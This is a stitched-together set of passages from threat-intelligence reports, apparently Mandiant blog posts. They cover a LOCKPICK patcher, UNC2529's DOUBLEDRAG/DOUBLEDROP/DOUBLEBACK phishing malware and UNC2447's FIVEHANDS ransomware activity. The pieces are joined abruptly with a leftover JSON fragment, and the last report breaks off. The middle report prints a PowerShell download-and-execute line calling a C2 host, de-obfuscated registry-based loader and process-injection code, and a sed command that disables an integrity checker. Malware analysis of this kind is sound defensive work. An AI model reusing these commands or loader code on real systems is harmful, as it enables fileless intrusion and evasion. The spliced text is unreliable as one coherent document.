a patcher utility responsible for inserting the malicious logic known as LOCKPICK. The patcher starts by running sed on the integrity checker script built into the appliance to insert an early exit routine. This is inserted by the command sed -i '12aexit 0' /home/bin/check_integrity.sh which when applied causes this script to exit without performing its intended checks. After this the sample uses python file read/write APIs to insert long strings of assembly that represent the logic known as LOCKPICK. This file is different from the other patchers we’ve identified in that it is python and specifically targets system integrity routines.

                "text": "In December 2020, Mandiant observed a widespread, global phishing campaign targeting numerous organizations across an array of industries. Mandiant tracks this threat actor as UNC2529 . Based on the considerable infrastructure employed, tailored phishing lures and the professionally coded sophistication of the malware, this threat actor appears experienced and well resourced. This blog post will discuss the phishing campaign, identification of three new malware families, DOUBLEDRAG, DOUBLEDROP and DOUBLEBACK, provide a deep dive into their functionality, present an overview of the actor’s modus operandi and our conclusions. A future blog post will focus on the backdoor communications and the differences between DOUBLEBACK samples to highlight the malware evolution. UNC2529 Phishing Overview Mandiant observed the first wave of the phishing campaign occur on Dec. 2, 2020, and a second wave between Dec. 11 and Dec. 18, 2020. During the initial flurry, Mandiant observed evidence that 28 organizations were sent phishing emails, though targeting was likely broader than directly observed. These emails were sent using 26 unique email addresses associated with the domain tigertigerbeads<.>com, and in only a small number of cases did we see the same address used across multiple recipient organizations. These phishing emails contained inline links to malicious URLs such as, hxxp://totallyhealth-wealth[.]com/downld-id_mw<redacted>Gdczs, engineered to entice the victim to download a file. UNC2529 employed at least 24 different domains to support this first, of a three-stage process. The structure of URLs embedded in these phishing emails had the following patterns, where the string was an alphabetic variable of unknown function. http://<fqdn>/downld-id_<string> http://<fqdn>/downld-id-<string> http://<fqdn>/files-upload_<string> http://<fqdn>/files-upload-<string> http://<fqdn>/get_file-id_<string> http://<fqdn>/get_file-id-<string> http://<fqdn>/zip_download_<string> http://<fqdn>/zip_download-<string> The first stage payload downloaded from these URLs consisted of a Zip compressed file containing a corrupt decoy PDF document and a heavily obfuscated JavaScript downloader. Mandiant tracks the downloader as DOUBLEDRAG. Interestingly, the PDF documents were obtained from public websites, but corrupted by removing bytes to render them unreadable with a standard PDF viewer. It is speculated that the victim would then attempt to launch the JavaScript (.js) file, which can be executed natively with Windows Script Host by simply double clicking on the file. All but one of the file name patterns for the ZIP, PDF and JS files were document_<state>_client-id_<4 digit number>.extension, such as “document_Ohio_client-id_8902.zip”. Each of the observed DOUBLEDRAG downloaders used in the first wave attempted to download a second-stage memory-only dropper, which Mandiant tracks as DOUBLEDROP, from either hxxp://p-leh[.]com/update_java.dat or hxxp://clanvisits[.]com/mini.dat. The downloaded file is a heavily obfuscated PowerShell script that will launch a backdoor into memory. Mandiant tracks this third-stage backdoor as DOUBLEBACK. DOUBLEBACK samples observed during the phishing campaign beaconed to hxxps://klikbets[.]net/admin/client.php and hxxps://lasartoria[.]net/admin/client.php. Prior to the second wave, observed between Dec. 11 and Dec. 18, 2020, UNC2529 hijacked a legitimate domain owned by a U.S. heating and cooling services company, modified DNS entries and leveraged that infrastructure to phish at least 22 organizations, five of which were also targeted in the first wave. It is not currently known how the legitimate domain was compromised. The threat actor used 20 newly observed domains to host the second-stage payload. The threat actor made slight modifications to the URL pattern during the second wave. http://<fqdn>/<string> http://<fqdn>/dowld_<string> http://<fqdn>/download_<string> http://<fqdn>/files_<string> http://<fqdn>/id_<string> http://<fqdn>/upld_<string> Of note, the DOUBLEDRAG downloader observed in the first wave was replaced with a Microsoft Excel document containing an embedded legacy Excel 4.0 (XLM) macro in Excel 97-Excel 2003 Binary file format (BIFF8). When the file was opened and the macro executed successfully, it would attempt to download a second-stage payload from hxxps://towncentrehotels[.]com/ps1.dat. The core functionality of the DOUBLEDRAG JavaScript file and the BIFF8 macro is to download a file from a hardcoded URL. This Excel file was also found within Zip files, as seen in the first wave, although only one of the observed Zip files included a corresponding corrupt decoy PDF document. Additional DOUBLEBACK samples were extracted from DOUBLEDROP samples uploaded to a public malware repository, which revealed additional command and control servers (C2), hxxps://barrel1999[.]com/admin4/client.php, hxxps://widestaticsinfo[.]com/admin4/client.php, hxxps://secureinternet20[.]com/admin5/client.php, and hxxps://adsinfocoast[.]com/admin5/client.php. Three of these domains were registered after the observed second wave. Tailored Targeting UNC2529 displayed indications of target research based on their selection of sender email addresses and subject lines which were tailored to their intended victims. For example, UNC2529 used a unique username, masquerading as an account executive for a small California-based electronics manufacturing company, which Mandiant identified through a simple Internet search. The username of the email address was associated with both sender domains, tigertigerbeads<.>com and the compromised HVAC company. Masquerading as the account executive, seven phishing emails were observed targeting the medical industry, high-tech electronics, automotive and military equipment manufacturers, and a cleared defense contractor with subject lines very specific to the products of the California-based electronics manufacturing company. Another example is a freight / transport company that received a phish with subject, “compton ca to flowery branch ga”, while a firm that recruits and places long-haul truck drivers received a simple, “driver” in the subject line. A utility company received a phish with subject, “easement to bore to our stairwell area.” While not all financial institutions saw seemingly tailored subjects, numerous appeared fairly unique, as shown in Table 1. Subject Lure Wave re: <redacted> outdoors environment (1 out of 3) 1st accepted: follow up with butch & karen 1st re: appraisal for <redacted> - smysor rd 2nd re: <redacted> financing 2nd Table 1: Sample financial industry subject lures Several insurance companies that were targeted saw less specific subjects, but still appropriate for the industry, such as those in Table 2. Subject Lure Wave fw: certificate of insurance 1st fw: insurance for plow 1st please get this information 1st question & number request 1st claim status 2nd applications for medicare supplement & part d 2nd Table 2: Sample insurance industry subject lures Interestingly, one insurance company with offices in eastern Texas received a phish with a subject related to a local water authority and an ongoing water project. While no public information was found to tie the company to the other organization or project, the subject appeared to be very customized. Some patterns were observed, as seen in Table 3. Additionally, UNC2529 targeted the same IT services organization in both waves using the same lure (1 and 5 in Table 3). Most of the phishing emails with lures containing “worker” targeted U.S. organizations. As “worker” isn’t a common way to refer to an employee in the U.S., this may indicate a non-native American English speaker. Subject Lure Wave dear worker, your work # ujcb0utczl 1st good day worker, your job number- 8ldbsq6ikd 1st hello worker, your work number- u39hbutlsf 1st good day candidate, your vacancy # xcmxydis4s 2nd dear worker, your work # ujcb0utczl 2nd Table 3: Sample pattern subject lures Industry and Regional Targeting UNC2529’s phishing campaign was both global and impacted an array of industries (Industry and Regional Targeting graphics are greater than 100% due to rounding). While acknowledging some telemetry bias, in both waves the U.S. was the primary target, while targeting of EMEA and Asia and Australia were evenly dispersed in the first wave, as shown in Figure 1. Figure 1: UNC2529 phishing campaign, first wave In the second wave, EMEA’s percentage increased the most, while the U.S. dropped slightly, and Asia and Australia remained at close to the same level, as illustrated in Figure 2. Figure 2: UNC2529 phishing campaign, second wave Although Mandiant has no evidence about the objectives of this threat actor, their broad targeting across industries and geographies is consistent with a targeting calculus most commonly seen among financially motivated groups. Technical Analysis Overview The Triple DOUBLE malware ecosystem consists of a downloader (DOUBLEDRAG) (or alternatively an Excel document with an embedded macro), a dropper (DOUBLEDROP), and a backdoor (DOUBLEBACK). As described in the previous section, the initial infection vector starts with phishing emails that contain a link to download a malicious payload that contains an obfuscated JavaScript downloader. Once executed, DOUBLEDRAG reaches out to its C2 server and downloads a memory-only dropper. The dropper, DOUBLEDROP, is implemented as a PowerShell script that contains both 32-bit and 64-bit instances of the backdoor DOUBLEBACK. The dropper performs the initial setup that establishes the backdoor’s persistence on the compromised system and proceeds by injecting the backdoor into its own process (PowerShell.exe) and then executing it. The backdoor, once it has the execution control, loads its plugins and then enters a communication loop, fetching commands from its C2 server and dispatching them. One interesting fact about the whole ecosystem is that only the downloader exists in the file system. The rest of the components are serialized in the registry database, which makes their detection somewhat harder, especially by file-based antivirus engines. Ecosystem in Details DOUBLEDRAG Downloader component The downloader is implemented as a heavily obfuscated JavaScript code. Despite the relatively large amount of the code, it boils down to the following snippet of code (Figure 3), after de-obfuscation. \"C:\\Windows\\System32\\cmd.exe\" /c oqaVepEgTmHfPyC & Po^wEr^sh^elL -nop -w hidden -ep bypass -enc <base64_encoded_ps_code> Figure 3: De-obfuscated JavaScript downloader The <base64_encoded_ps_code> downloads and executes a PowerShell script that implements the DOUBLEDROP dropper. Note, that the downloaded dropper does not touch the file system and it is executed directly from memory. A sanitized version of the code, observed in the first phishing wave, is shown in Figure 4. IEX (New-Object Net.Webclient).downloadstring(\"hxxp://p-leh[.]com/update_java.dat\") Figure 4: Downloading and executing of the DOUBLEDROP dropper DOUBLEDROP Dropper component Overview The dropper component is implemented as an obfuscated in-memory dropper written in PowerShell. Two payloads are embedded in the script—the same instances of the DOUBLEBACK backdoor compiled for 32 and 64-bit architectures. The dropper saves the encrypted payload along with the information related to its decryption and execution in the compromised system’s registry database, effectively achieving a file-less malware execution. Setup The dropper's main goal is to serialize the chosen payload along with the loading scripts into the compromised system's registry database and to ensure that the payload will be loaded following a reboot or a user login (see the Persistence Mechanism section). In order to do so, the dropper generates three pseudo-random GUIDs and creates the registry keys and values shown in Figure 5. * HK[CU|LM]\\Software\\Classes\\CLSID\\{<rnd_guid_0>} * key: LocalServer * value: <default> * data: <bootstrap_ps_code> * key: ProgID * value: <default> * data: <rnd_guid_1> * value: <last_4_chars_of_rnd_guid_0> * data: <encoded_loader> * key: VersionIndependentProgID * value: <default> * data: <rnd_guid_1> * value: <first_4_chars_of_rnd_guid_0> * data: <encoded_rc4_key> * value: <last_4_chars_of_rnd_guid_0> * data: <rc4_encrypted_payload> * HK[CU|LM]\\Software\\Classes\\{<rnd_guid_1>} * value: <default> * data: <rnd_guid_1> * key: CLSID * value: <default> * data: <rnd_guid_0> * HK[CU|LM]\\Software\\Classes\\CLSID\\{<rnd_guid_2>} * value: <default> * data: <rnd_guid_1> * key: TreatAs * value: <default> * data: <rnd_guid_0> Figure 5: Registry keys and values created by the dropper Once the registry keys and values are created, the dropper dynamically generates the bootstrap and the launcher PowerShell scripts and saves them under the {<rnd_guid_0>} registry key as shown in Figure 5. Additionally, at this point the dropper generates a random RC4 key and encodes it inside a larger buffer which is then saved under the VersionIndependentProgID key. The actual RC4 key within the buffer is given by the following calculations, shown in Figure 6 (note that the key is reversed!). <relative_offset> = buffer[32] buffer[32 + <relative_offset> + 1] = <reversed_rc4_key> Figure 6: Encoding of the RC4 key Finally, the dropper encrypts the payload using the generated RC4 key and saves it in the respective value under the VersionIndependentProgId registry key (see Figure 5). At this point all the necessary steps that ensure the payload's persistence on the system are complete and the dropper proceeds by directly executing the launcher script, so the backdoor receives the execution control immediately. The persistence mechanism, the bootstrap, and the launcher are described in more details in the following sections. Persistence Mechanism The persistence mechanism implemented by the DOUBLEDROP sample is slightly different depending on whether the dropper has been started within an elevated PowerShell process or not. If the dropper was executed within an elevated PowerShell process, it creates a scheduled task with an action specified as TASK_ACTION_COM_HANDLER and the class ID - the {<rnd_guid_2>} GUID (See Figure 5). Once executed by the system, the task finds the {<rnd_guid_2>} class under the HKLM\\Software\\Classes\\CLSID registry path, which in this case points to an emulator class via the TreatAs registry key. The {<rnd_guid_0>} emulator class ID defines a registry key LocalServer and its default value will be executed by the task. If the dropper is started within a non-elevated PowerShell process, the sequence is generally the same but instead of a task, the malware hijacks one of the well-known classes, Microsoft PlaySoundService ({2DEA658F-54C1- 4227-AF9B-260AB5FC3543}) or MsCtfMonitor ({01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}), by creating an associated TreatAs registry key under their definition in the registry database. The TreatAs key's default registry value points to the {<rnd_guid_0>} emulator class essentially achieving the same execution sequence as in the elevated privilege case. Bootstrap The bootstrap is implemented as an obfuscated PowerShell script, generated dynamically by the dropper. The content of the code is saved under the emulator's class LocalServer registry key and it is either executed by a dedicated task in case of a privileged PowerShell process or by the operating system that attempts to load the emulator for the PlaySoundService or MsCtfMonitor classes. The bootstrap code finds the location of the launcher script, decodes it and then executes it within the same PowerShell process. A decoded and sanitized version of the script is shown in Figure 7. $enc = [System.Text.Encoding]::UTF8; $loader = Get-ItemProperty -Path($enc.GetString([Convert]::FromBase64String('<base64_encoded_path_to_launcher>'))) -n '<launcher_reg_val>' | Select-Object -ExpandProperty '<launcher_reg_val>'; $xor_val = <xor_val>; iex( $enc.GetString($( for ($i = 0; $i -lt $loader.Length; $i++) { if ($xor_val -ge 250) { $xor_val = 0 } $loader[$i] -bxor $xor_val; $xor_val += 4 } )) ) Figure 7: De-obfuscated and sanitized bootstrap code Note that the actual values for <base64_encoded_path_to_launcher> , <launcher_reg_val> , and <xor_val> are generated on the fly by the dropper and will be different across the compromised systems. The encoding of the launcher is implemented as a simple rolling XOR that is incremented after each iteration. The following code snippet (Figure 8) could be used to either encode or decode the launcher, given the initial key. def encdec(src, key): out = bytearray() for b in src: if key >= 250: key = 0 out.append(b ^ key) key += 4 return out Figure 8: Algorithm to Decode the Launcher Once the launcher is decoded it is executed within the same PowerShell process as the bootstrap by calling the iex (Invoke-Expression) command. Launcher The launcher responsibility, after being executed by the bootstrap code, is to decrypt and execute the payload saved under the VersionIndependentProgID registry key. To do so, the launcher first decodes the RC4 key provided in the <first_4_chars_of_rnd_guid_0> value (see Figure 5) and then uses it to decrypt the payload. Once the payload is decrypted, the launcher allocates virtual memory enough to house the image in memory, copies it there, and finally creates a thread around the entry point specified in the dropper. The function at that entry point is expected to lay the image in memory, to relocate the image, if necessary, to resolve the imports and finally—to execute the payload's entry point. A sanitized and somewhat de-obfuscated version of the launcher is shown in Figure 9. function DecryptPayload { param($fn7, $xf7, $mb5) $fn1 = Get-ItemProperty -Path $fn7 -n $mb5 | Select-Object -ExpandProperty $mb5; $en8 = ($fn1[32] + (19 + (((5 - 2) + 0) + 11))); $ow7 = $fn1[$en8..($en8 + 31)]; [array]::Reverse($ow7); $fn1 = Get-ItemProperty -Path $fn7 -n $xf7 | Select-Object -ExpandProperty $xf7; $en8 = { $xk2 = 0..255; 0..255 | % { $wn4 = ($wn4 + $xk2[$_] + $ow7[$_ % $ow7.Length]) % (275 - (3 + (11 + 5))); $xk2[$_], $xk2[$wn4] = $xk2[$wn4], $xk2[$_] }; $fn1 | % { $sp3 = ($sp3 + 1) % (275 - 19); $si9 = ($si9 + $xk2[$sp3]) % ((600 - 280) - 64); $xk2[$sp3], $xk2[$si9] = $xk2[$si9], $xk2[$sp3]; $_-bxor$xk2[($xk2[$sp3] + $xk2[$si9]) % (343 - ((1 + 0) + 86))] } }; $ry6 = (& $en8 | foreach-object { '{0:X2}' -f $_ }) -join ''; ($(for ($sp3 = 0; $sp3 -lt $ry6.Length; $sp3 += 2) { [convert]::ToByte($ry6.Substring($sp3, 2), (17 - ((1 + 0)))) } ) ) } function ExecuteApi { param($fn7, $xf7) $vy9 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('?RND?')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('?RND?', $false).DefineType('?RND?', 'Class,Public,Sealed,AnsiClass,AutoClass', [System.MulticastDelegate]); $vy9.DefineConstructor('RTSpecialName,HideBySig,Public', [System.Reflection.CallingConventions]::Standard, $fn7).SetImplementationFlags('Runtime,Managed'); $vy9.DefineMethod('Invoke', 'Public,HideBySig,NewSlot,Virtual', $xf7, $fn7).SetImplementationFlags('Runtime,Managed'); $vy9.CreateType() } function GetProcAddress { param($fn7) $fq3 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods'); $lr3 = New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($fq3.GetMethod('GetModuleHandle').Invoke(0, @('kernel32.dll')))); $fq3.GetMethod('GetProcAddress', [reflection.bindingflags] 'Public,Static', $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null).Invoke($null, @([System.Runtime.InteropServices.HandleRef]$lr3, $fn7)) } $decryptedPayload = DecryptPayload 'hklm:\\software\\classes\\CLSID\\<rnd_guid_0>\\VersionIndependentProgID' '<reg_val_payload>' '<reg_val_rc4_key>'; function InjectPayload { param($payload, $payloadLen, $entryPoint, $access) $mem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress 'VirtualAllocEx'), (ExecuteApi @([IntPtr], [IntPtr], [IntPtr], [int], [int])([Intptr]))).invoke(-1, 0, $payloadLen, 0x3000, $access); [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress 'RtlMoveMemory'), (ExecuteApi @([IntPtr], [byte[]], [UInt32])([Intptr]))).invoke($mem, $payload, $payloadLen); $mem = New-Object System.Intptr -ArgumentList $($mem.ToInt64() + $entryPoint); [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress 'CreateThread'), (ExecuteApi @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])([Intptr]))).invoke(0, 0, $mem, 0, 0, 0); Start-Sleep -s (((2673 - 942) + 1271)) } # 0x36dc = Loader Entry Point, rva # 0x40 = PAGE_EXECUTE_READWRITE InjectPayload $decryptedPayload $decryptedPayload.length 0x36dc 0x40 Figure 9: De-obfuscated and sanitized launcher script DOUBLEBACK Backdoor component Overview The observed DOUBLEDROP instances contain a well-designed backdoor implemented as a 32 or 64-bit PE dynamic library which we track as DOUBLEBACK. The backdoor is initially mapped into the same PowerShell process started by the bootstrap script, but it will then inject itself into a msiexec.exe process if certain conditions are met. By design, the core of the backdoor functionality is intended to be executed after injected into a newly spawned msiexec.exe process. In contrast with other backdoors DOUBLEBACK does not have its services hardcoded and the functionality is expected to be implemented as plugins that are expected to be serialized in the registry database under a host-specific registry path. That way, the backdoor can be configured to implement a flexible set of services depending on the target. With all the common functionality implemented as plugins, the backdoor’s main goal is to establish a communication framework ensuring data integrity between the C2 server and the appropriate plugins. Details The backdoor starts by retrieving its process name and ensures that it is either powershell.exe or msiexec.exe. In all other cases, the malware will immediately terminate itself. Normally, when first started on the system, the backdoor will be injected into the same PowerShell process that executes both the bootstrap code and the launcher. In that mode the malware may spawn (depending on certain conditions) a msiexec process and injects itself into it. More details about the logic implemented in the PowerShell and the msiexec branches are provided in the following sections. Next, the backdoor ensures that it is the only DOUBLEBACK instance currently executing on the compromised system. To do that, the malware generates a host-based pseudo-unique GUID and uses it as a mutex name. The algorithm first generates a pseudo-unique host identifier that is based on the system volume's serial number and a hardcoded salt value, as shown in Figure 10. # oberserved salt = 0x436ea76d def gen_host_id(vol_ser_num, salt): salted_val = (vol_ser_num + salt) & 0xffffffff md5 = hashlib.md5(bytes(salted_val.to_bytes(4, 'little'))) second_dword = struct.unpack('<i', md5.digest()[4:8])[0] return (salted_val + second_dword) & 0xffffffff Figure 10: Host ID generation algorithm Next, the malware passes the generated host ID to another algorithm that generates a pseudo-unique GUID based on the input, as shown in Figure 11. # src is the host ID def gen_guid(src): b = bytearray() xor = 0xaabbccdd for _ in range(4): b += src.to_bytes(4, byteorder='little') src ^= xor xor = (xor + xor) & 0xffffffff return uuid.UUID(bytes_le=bytes(b)) Figure 11: GUID generation algorithm Once the GUID is generated the malware formats it as Global\\{ <guid> } and attempts to open a mutex with that name. In case the mutex is already created the backdoor assumes that another instance of itself is already running and terminates itself. Otherwise, the backdoor creates the mutex and branches out depending on the detected process it currently mapped into. Executing Within the PowerShell Process The initial state of the backdoor execution is when it is mapped into a PowerShell process created by the bootstrap code. In this mode, the backdoor attempts to relocate itself into a new instance of msiexec.exe. Before the injection is attempted, the backdoor enumerates the running processes looking for Kaspersky Antivirus (avp.exe, avpui.exe) or BitDefender (bdagent.exe, bdservbdagent.exe, bdservicehost.exe) engines. This part of the functionality seems to be a work in progress because the malware ignores the fact if the Kaspersky software is detected but it will not attempt injecting into the msiexec.exe process in case BitDefender is found running on the compromised system. In the latter case, the backdoor's main functionality will be executed inside the same PowerShell process and no new instance of msiexec.exe will be created. The injection process involves finding the backdoor's image under the appropriate registry key. Note, that the backdoor instance we have observed in the first wave does not handle situations when the malware ecosystem is installed as an administrator—such cases would end up with the backdoor not able to locate its image for injecting. In all other cases, the malware starts with the well-known class GUIDs of the PlaySoundService and MsCtfMonitor classes and attempts to find which of them has the TreatAs registry key under their definition. Once the TreatAs key is found, its default registry value points to the registry key that has the RC4-encrypted backdoor image and the encoded RC4 key both described in the previous section of the post. With the backdoor image loaded in memory and decrypted, the malware spawns a suspended process around msiexec.exe and inject its image into it. The backdoor PE file exports a single function that is used to lay down its own image in memory and execute its DllMain entry point. The export function allocates the needed memory, relocates the image, if needed, resolves the imports and finally executes the backdoor’s DllMain function. At this point the backdoor is running inside the hijacked msiexec.exe and the instance inside the PowerShell process terminates itself. Executing as Injected in the msiexec.exe Process Overview The DOUBLEBACK backdoor executes its main functionality while injected in a dedicated msiexec.exe process (provided BitDefender AV is not found running on the system). The main logical modules of the backdoor are its configuration, plugin management, and communications. In the following sections we will describe the first two, while a future blog post will focus on the communications and the evolution of the backdoor. Configuration The backdoor uses an embedded configuration that contains the C2 URLs and a key (more about the key in the second part of the post). The configuration data is formatted as shown in Figure 12. struct tag_config_header_t { uint32_t xor_val_1; uint32_t xor_val_2; uint32_t xor_val_3; uint32_t xor_val_4; } config_header_t; struct tag_config_t { config_header_t header; uint8_t encoded_config[]; } config_t; Figure 12: Encoded configuration format The length of the encoded_config data is provided by the XOR-ing of the xor_val_1 and xor_val_2 fields of the config_header_t structure. The config_t.encoded_config blob can be decoded by XOR-ing the data with the config_header_t.xor_val_1. The decoded configuration data consists of a comma-separated list of URLs followed by a key that is used in the communication module. The first two bytes specify the lengths of the comma-separated URL list and the key, respectively. The URLs in the observed samples follow the pattern shown in Figure 13. https://<server>/admin<n>/client.php Figure 13: Observed C2 URL pattern The initial sample did not have any value for <n> but the samples after that were observed to use <n> equal to 4 or 5. Plugin Management The backdoor's core functionality is implemented via plugins designed as PE Windows dynamic libraries. The plugins, as with the other backdoor components, are also saved in the registry database under a host-specific registry key. The full path to the plugins location is formatted as HK[LM|CU]:\\Software\\Classes\\CLSID\\{ <plugins_home_guid> }, where <plugins_home_guid> is generated by the GUID algorithm shown in Figure 11 with a host-specific value we call implant ID which is used not only to generate the path to the plugins but with the backdoor’s C2 communications and it is also passed as a parameter to each of the plugins during their initialization. The implant ID is generated by seeding the Linear Congruential Generator (LCG) algorithm, shown in Figure 14, with the host ID and the <max_range> value is set to 0x54c5638. The value generated by the LCG is then added to 0x989680 and the result serves as the implant ID. def lcg(max_range): global seed if seed == 0: seed = get_RDTSC() n = (0x7fffffed * seed + 0x7fffffc3) & 0xffffffff val = n % max_range seed = n return val Figure 14: Linear Congruential Generator used by the backdoor The backdoor enumerates all the registry values under the plugins home location (the registry value names are insignificant) and expects each of the plugins to be formatted, as shown in Figure 15. struct tag_plugin_header_t { uint32_t xor_val; uint32_t param_2; the second parameter of the pfn_init uint32_t len_1; uint32_t len_2; uint32_t pfn_init; uint32_t pfn_cleanup; uint32_t param_3; the third parameter of the pfn_init uint32_t unused; } plugin_header_t; struct tag_plugin_t { plugin_header_t header; uint8_t encoded_plugin[]; } plugin_t; Figure 15: Encoded plugins format As shown in Figure 15, the plugin data starts with a 32-byte long header followed by the encoded plugin DLL. The plugin encoding is implemented as a combination of rolling DWORD/BYTE XOR with initial value specified by the plugin_header_t.xor_val value. The plugin_header_t.len_1 stores the number of DWORDS to be decoded with plugin_header_t.xor_val which is incremented by 4 after each iteration. The plugin_header_t.len_2 specifies the number of bytes to be decoded at the current position after the previous operation with the current value of the plugin_header_t.xor_val (only the least significant byte is taken). In this mode the plugin_header_t.xor_val value is incremented by one after each iteration. The plugins are expected to export at least two functions—one for initialization and another to clean up the resources before unloading. The initialization routine takes four parameters—two from the header and two calculated by the backdoor, as shown Figure 16. pfn_init(implant_id, plugin_header_t.param_2, plugin_header_t.param_3, p_plugin_image_in_memory) Figure 16: Plugins initialization routine prototype The current backdoor's implementation provides support for up to 32 plugins with each of them mapped and initialized in the backdoor's process space. Additional Notes The first backdoor instance we observed back in December 2020 was a stable and well-written code, but it was clearly a work in progress. For example, the early instance of the malware spawns a thread to secure delete the DOUBLEDROP dropper from disk which indicates that an earlier variant of this malware launched a copy of the dropper from the file system. The dropper would save its current location on disk in the default registry value under the HK[LM|CU]:\\Software\\Classes key. The backdoor spawns a dedicated thread that retrieves the dropper’s path and then proceeds to overwrite the image on disk with 0x00, 0xFF, and a randomly generated byte before deleting the dropper from the file system. Additionally, the early instance of the backdoor, as mentioned, would not handle the situations when an elevated PowerShell process is used. The dropper would use a scheduled task in that case with the relevant registry keys created under the HKLM hive but the backdoor does not support that case and will not be able to find its image under the specific key in order to inject itself into the msiexec.exe process. Finally, the backdoor would output debug information in a few cases using the OutputDebugString API. Interestingly, the format and the generation of the log message is the same as the one used in the publicly available PEGASUS code ( preliminary technical analysis: Pegasus Malware Source Code ). The PEGASUS backdoor is distributed with modules that allow it to manipulate files generated by common Russian payment processing software that is used to assess and process VAT refunds. When executed on a workstation running targeted software, the malware can attempt to add VAT to transactions that are normally exempt and directs associated tax refunds to attacker-controlled bank accounts. Conclusion Considerable resources were employed by UNC2529 to conduct their December phishing campaign. Almost 50 domains supported various phases of the effort, targets were researched, and a legitimate third-party domain was compromised. The threat actor made extensive use of obfuscation and fileless malware to complicate detection to deliver a well coded and extensible backdoor. UNC2529 is assessed as capable, professional and well resourced. The identified wide-ranging targets, across geography and industry suggests a financial crime motive. DOUBLEBACK appears to be an ongoing work in progress and Mandiant anticipates further actions by UNC2529 to compromise victims across all industries worldwide.

Based on technical and temporal observations of HELLOKITTY and FIVEHANDS deployments, Mandiant suspects that HELLOKITTY may have been used by an overall affiliate program from May 2020 through December 2020, and FIVEHANDS since approximately January 2021. Background In November 2020, Mandiant created UNC2447, an uncategorized group observed using the novel WARPRISM PowerShell dropper to install BEACON at two Mandiant Managed Defense clients. Mandiant Managed Defence quicky neutralized these intrusions and did not observe attempts to deploy ransomware. In January and February 2021, Mandiant Consulting observed a novel rewrite of DEATHRANSOM—dubbed FIVEHANDS—along with SOMBRAT at multiple victims that were extorted. During one of the ransomware intrusions, the same WARPRISM and BEACON samples previously clustered under UNC2447 were observed. Mandiant was able to forensically link the use of WARPRISM, BEACON, SOMBRAT and FIVEHANDS to the same actor. Mandiant suspects that HELLOKITTY activity in late-2020 may be related to the overall affiliate program and that usage shifted to FIVEHANDS ransomware beginning in January 2021. In April 2021, Mandiant observed a private FIVEHANDS TOR chat using a HELLOKITTY favicon (Figure 1). Figure 1: FIVEHANDS Hello Kitty icon When affiliate-based ransomware is observed by Mandiant, uncategorized clusters are assigned based on the infrastructure used, and in the case of UNC2447 were based on the SOMBRAT and Cobalt Strike BEACON infrastructure used across 5 intrusions between November 2020 and February 2021. Generally, Mandiant uses caution even with novel malware such as SOMBRAT and WARPRISM and clusters each use rigorously according to all observed activity. For more information on uncategorized threats, refer to our post, \" DebUNCing Attribution: How Mandiant Tracks Uncategorized Threat Actors .\" SonicWall SMA 100 Series Appliance Vulnerability CVE-2021-20016 is a critical SQL injection vulnerability that exploits unpatched SonicWall Secure Mobile Access SMA 100 series remote access products. A remote, unauthenticated attacker could submit a specially crafted query in order to exploit the vulnerability. Successful exploitation would grant an attacker the ability to access login credentials (username, password) as well as session information that could then be used to log into a vulnerable unpatched SMA 100 series appliance. This vulnerability only impacted the SMA 100 series and was patched by SonicWall in February 2021. For more information on this vulnerability, please refer to SonicWall PSIRT advisory SNWLID-2021-0001 . WARPRISM WARPRISM is a PowerShell dropper that has been observed by Mandiant delivering SUNCRYPT, BEACON, and MIMIKATZ. WARPRISM is used to evade endpoint detection and will load its payload directly into memory. WARPRISM may be used by multiple groups. FOXGRABBER FOXGRABBER is a command line utility used to harvest FireFox credential files from remote systems. It contains the PDB path: C:\\Users\\kolobko\\Source\\Repos\\grabff\\obj\\Debug\\grabff.pdb. FOXGRABBER has also been observed in DARKSIDE ransomware intrusions. BEACON Malleable Profiles In the initial stages of an intrusion, UNC2447 uses the Cobalt Strike BEACON HTTPSSTAGER implant for persistence to communicate with command-and-control (C2) servers over HTTPS and has been observed using ‘chches_APT10’ and ‘Havex’ Malleable profiles. UNC2447 Toolbox During the recon and exfiltration stage of intrusions, UNC2447 has been observed using the following tools: ADFIND, BLOODHOUND, MIMIKATZ, PCHUNTER, RCLONE, ROUTERSCAN, S3BROWSER, ZAP and 7ZIP. UNC2447 may tamper with windows security settings, firewall rules, and antivirus protection. SOMBRAT Overview SOMBRAT was first reported by Blackberry Cylance in November 2020 as \" The CostaRicto Campaign: Cyber-Espionage Outsourced \" as a potential espionage-for-hire criminal group. Mandiant has now observed SOMBRAT alongside FIVEHANDS ransomware intrusions. The SOMBRAT backdoor is packaged as a 64-bit Windows executable. It communicates with a configurable command and control (C2) server via multiple protocols, including DNS, TLS-encrypted TCP, and potentially WebSockets. Although the backdoor supports dozens of commands, most of them enable the operator to manipulate an encrypted storage file and reconfigure the implant. The backdoor's primary purpose is to download and execute plugins provided via the C2 server. In contrast to the SOMBRAT version published in November 2020, Mandiant observed additional obfuscation and armoring to evade detection, this SOMBRAT variant has been hardened to discourage analysis. Program metadata typically included by the compiler has been stripped and strings have been inlined and encoded via XOR-based routines. The SOMBRAT Launcher This SOMBRAT backdoor variant must be deployed alongside four additional resources that serve as launchers. They are typically installed to the hardcoded directory path `C:\\ProgramData\\Microsoft`. path: `C:\\programdata\\Microsoft\\WwanSvc.bat` - launcher for `WwanSvc.txt` path: `C:\\programdata\\Microsoft\\WwanSvc.txt` - decoder and launcher for `WwanSvc.c` path: `C:\\programdata\\Microsoft\\WwanSvc.c` - decoder and launcher for `WwanSvc.b` path: `C:\\programdata\\Microsoft\\WwanSvc.a` - XOR key path: `C:\\programdata\\Microsoft\\WwanSvc.b` - encoded SOMBRAT backdoor path: `%TEMP%\\<possibly unique random name>` - encrypted storage file path: `%TEMP%\\<possibly unique random name _<integer>` - encrypted storage file path: `C:\\ProgramData\\<possibly unique random name ` - encrypted configuration file 